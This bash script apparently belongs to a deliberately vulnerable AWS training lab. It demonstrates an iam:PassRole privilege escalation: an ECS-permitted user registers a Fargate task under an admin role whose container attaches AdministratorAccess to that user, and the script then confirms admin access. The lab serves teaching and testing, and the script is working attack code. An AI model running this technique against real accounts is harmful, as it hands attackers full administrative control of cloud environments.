#!/bin/bash

# Demo script for iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-createservice privilege escalation
# This scenario demonstrates how a user with ECS permissions can escalate to admin by creating
# a Fargate service with an admin role that modifies IAM permissions

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-ecs-001-to-admin-starting-user"
TARGET_ROLE_NAME="pl-prod-ecs-001-to-admin-target-role"
CLUSTER_NAME="pl-prod-ecs-001-attack-cluster"
TASK_FAMILY="pl-ecs-001-admin-escalation"
SERVICE_NAME="pl-prod-ecs-001-attack-service"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}ECS Service PassRole Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_001_iam_passrole_ecs_createcluster_ecs_registertaskdefinition_ecs_createservice.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create ECS cluster
echo -e "${YELLOW}Step 5: Creating ECS cluster${NC}"
echo "Cluster name: $CLUSTER_NAME"

aws ecs create-cluster \
    --region $AWS_REGION \
    --cluster-name $CLUSTER_NAME \
    --output json > /dev/null

echo -e "${GREEN}✓ Successfully created ECS cluster${NC}\n"

# Step 6: Get VPC and subnet for network configuration
echo -e "${YELLOW}Step 6: Getting network configuration for Fargate${NC}"

# Get default VPC
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

if [ "$DEFAULT_VPC" == "None" ] || [ -z "$DEFAULT_VPC" ]; then
    echo -e "${RED}Error: No default VPC found${NC}"
    exit 1
fi

echo "Default VPC: $DEFAULT_VPC"

# Get subnets from default VPC
SUBNETS=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[*].SubnetId' \
    --output text)

# Take first two subnets
SUBNET_1=$(echo $SUBNETS | awk '{print $1}')
SUBNET_2=$(echo $SUBNETS | awk '{print $2}')

echo "Using subnets: $SUBNET_1, $SUBNET_2"
echo -e "${GREEN}✓ Retrieved network configuration${NC}\n"

# Step 7: Register task definition with admin role
echo -e "${YELLOW}Step 7: Registering task definition with admin role${NC}"
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE_NAME"
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "This task will attach AdministratorAccess to the starting user"

# Create task definition JSON
TASK_DEFINITION=$(cat <<EOF
{
  "family": "$TASK_FAMILY",
  "taskRoleArn": "$TARGET_ROLE_ARN",
  "executionRoleArn": "$TARGET_ROLE_ARN",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "public.ecr.aws/docker/library/alpine:latest",
      "essential": true,
      "command": [
        "sh",
        "-c",
        "apk add --no-cache aws-cli && aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo 'Admin policy attached successfully' && sleep 10"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-region": "$AWS_REGION",
          "awslogs-group": "/ecs/pl-ecs-001-escalation",
          "awslogs-stream-prefix": "ecs",
          "awslogs-create-group": "true"
        }
      }
    }
  ]
}
EOF
)

# Register the task definition
TASK_DEF_ARN=$(aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEFINITION" \
    --query 'taskDefinition.taskDefinitionArn' \
    --output text)

echo "Registered task definition: $TASK_DEF_ARN"
echo -e "${GREEN}✓ Successfully registered task definition (PassRole executed)${NC}\n"

# Step 8: Create ECS service on Fargate
echo -e "${YELLOW}Step 8: Creating ECS service on Fargate${NC}"
echo "Service name: $SERVICE_NAME"

# Create service configuration
SERVICE_CONFIG=$(cat <<EOF
{
  "cluster": "$CLUSTER_NAME",
  "serviceName": "$SERVICE_NAME",
  "taskDefinition": "$TASK_FAMILY",
  "desiredCount": 1,
  "launchType": "FARGATE",
  "networkConfiguration": {
    "awsvpcConfiguration": {
      "subnets": ["$SUBNET_1", "$SUBNET_2"],
      "assignPublicIp": "ENABLED"
    }
  }
}
EOF
)

aws ecs create-service \
    --region $AWS_REGION \
    --cli-input-json "$SERVICE_CONFIG" \
    --output json > /dev/null

echo -e "${GREEN}✓ Successfully created ECS service${NC}\n"

# Step 9: Wait for service to become ACTIVE and have running tasks
echo -e "${YELLOW}Step 9: Waiting for service to become active and launch task${NC}"
echo "This may take 60-90 seconds..."

MAX_WAIT=180
ELAPSED=0
SERVICE_ACTIVE=false

while [ $ELAPSED -lt $MAX_WAIT ]; do
    SERVICE_INFO=$(aws ecs describe-services \
        --region $AWS_REGION \
        --cluster $CLUSTER_NAME \
        --services $SERVICE_NAME \
        --query 'services[0]' \
        --output json)

    SERVICE_STATUS=$(echo $SERVICE_INFO | jq -r '.status')
    RUNNING_COUNT=$(echo $SERVICE_INFO | jq -r '.runningCount')

    # Use AND logic to check both conditions
    if [ "$SERVICE_STATUS" == "ACTIVE" ] && [ "$RUNNING_COUNT" -gt 0 ]; then
        SERVICE_ACTIVE=true
        echo -e "${GREEN}✓ Service is ACTIVE with running tasks${NC}"
        break
    fi

    echo "  Status: $SERVICE_STATUS, Running tasks: $RUNNING_COUNT (waiting...)"
    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ "$SERVICE_ACTIVE" = false ]; then
    echo -e "${RED}Service did not become active within timeout${NC}"
    exit 1
fi
echo ""

# Step 10: Wait for task to complete (reach STOPPED status)
echo -e "${YELLOW}Step 10: Waiting for task to complete its work${NC}"
echo "Monitoring task status..."

MAX_TASK_WAIT=120
TASK_ELAPSED=0
TASK_COMPLETED=false

while [ $TASK_ELAPSED -lt $MAX_TASK_WAIT ]; do
    # Get the task ARN
    TASK_ARN=$(aws ecs list-tasks \
        --region $AWS_REGION \
        --cluster $CLUSTER_NAME \
        --service-name $SERVICE_NAME \
        --query 'taskArns[0]' \
        --output text)

    if [ "$TASK_ARN" != "None" ] && [ -n "$TASK_ARN" ]; then
        TASK_STATUS=$(aws ecs describe-tasks \
            --region $AWS_REGION \
            --cluster $CLUSTER_NAME \
            --tasks $TASK_ARN \
            --query 'tasks[0].lastStatus' \
            --output text)

        echo "  Task status: $TASK_STATUS"

        if [ "$TASK_STATUS" == "STOPPED" ]; then
            TASK_COMPLETED=true
            echo -e "${GREEN}✓ Task completed successfully${NC}"
            break
        fi
    fi

    sleep 10
    TASK_ELAPSED=$((TASK_ELAPSED + 10))
done

if [ "$TASK_COMPLETED" = false ]; then
    echo -e "${YELLOW}⚠ Task did not complete within timeout, but may have succeeded${NC}"
fi
echo ""

# Step 11: Wait for IAM policy propagation
echo -e "${YELLOW}Step 11: Waiting for IAM policy to propagate${NC}"
echo "Waiting 15 seconds for policy changes to take effect..."
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 12: Verify administrator access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ECS permissions)"
echo "2. Created ECS cluster: $CLUSTER_NAME"
echo "3. Registered task definition with admin role: $TARGET_ROLE_NAME"
echo "4. Created Fargate service that launched privileged task"
echo "5. Task attached AdministratorAccess policy to starting user"
echo "6. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS cluster: $CLUSTER_NAME"
echo "- ECS service: $SERVICE_NAME"
echo "- Task definition: $TASK_FAMILY"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The starting user now has admin privileges!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
